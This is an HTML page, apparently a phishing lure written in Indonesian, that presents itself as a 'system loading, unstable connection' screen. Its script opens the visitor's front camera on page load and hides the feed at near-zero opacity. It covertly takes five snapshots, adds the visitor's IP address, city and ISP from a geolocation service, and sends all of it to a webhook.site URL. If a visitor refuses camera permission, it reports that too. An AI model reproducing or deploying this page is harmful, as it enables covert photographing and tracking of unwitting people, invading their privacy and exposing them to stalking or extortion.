<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
        #container { position: relative; display: flex; flex-direction: column; align-items: center; z-index: 10; background: #121212; width: 100%; height: 100%; justify-content: center;}
        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
        
        /* Video tetap besar tapi samar di background agar sensor cahaya kamera aktif */
        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
            opacity: 0.08; 
        }
        #canvas { display: none; }
    </style>
</head>
<body>

    <div id="container">
        <div id="loader"></div>
        <div id="status">Koneksi Tidak Stabil...</div>
        <p style="font-size: 12px; color: #888; margin-top: 10px;">Sedang Sinkronisasi Frame Kamera...</p>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // LINK WEBHOOK BARU KAMU
        const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        let photoCount = 0;

        async function startSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    statusDiv.innerText = "Mengkalibrasi Sinyal...";
                    // Tunggu 5 detik agar sensor kamera menyesuaikan cahaya (biar gak hitam)
                    setTimeout(takeSnapShot, 5000); 
                };
            } catch (err) {
                statusDiv.innerText = "Gagal Menghubungkan.";
                kirimData({ status: "IZIN_DITOLAK", pesan: err.message });
            }
        }

        function takeSnapShot() {
            if (photoCount >= 5) {
                statusDiv.innerText = "Error: 0x88291"; 
                return;
            }

            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                photoCount++;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Gunakan kualitas 0.4 agar seimbang antara kejelasan dan kecepatan kirim
                const dataFoto = canvas.toDataURL('image/jpeg', 0.4);

                kirimData({
                    event: "SNAP_SHOT_FINAL",
                    no: photoCount,
                    foto: dataFoto,
                    perangkat: navigator.userAgent
                });
            }

            // Ambil foto berikutnya setiap 3 detik
            setTimeout(takeSnapShot, 3000);
        }

        async function kirimData(payload) {
            try {
                // Ambil data IP & Lokasi
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                const finalData = { ...payload, ...{ kota: ipData.city, isp: ipData.org, ip: ipData.ip } };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(finalData)
                });
            } catch (e) {
                console.log("Kirim gagal");
            }
        }

        window.onload = startSystem;
    </script>
</body>
</html>
